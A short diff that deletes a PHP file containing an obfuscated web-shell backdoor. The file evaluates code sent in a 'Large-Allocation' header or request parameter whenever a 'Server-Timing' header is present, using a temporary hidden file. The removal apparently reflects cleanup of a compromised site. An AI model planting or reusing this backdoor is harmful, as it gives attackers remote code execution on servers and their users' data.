@@ -1,9 +1,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['Server-Timing'])) {
-    $c = "<\x3fp\x68p\x20@\x65v\x61l\x28$\x5fH\x45A\x44E\x52S\x5b\"\x4ca\x72g\x65-\x41l\x6co\x63a\x74i\x6fn\x22]\x29;\x40e\x76a\x6c(\x24_\x52E\x51U\x45S\x54[\x22L\x61r\x67e\x2dA\x6cl\x6fc\x61t\x69o\x6e\"\x5d)\x3b";
-    $f = '.'.time();
-    file_put_contents($f, $c);
-    include($f);
-    unlink($f);
-}
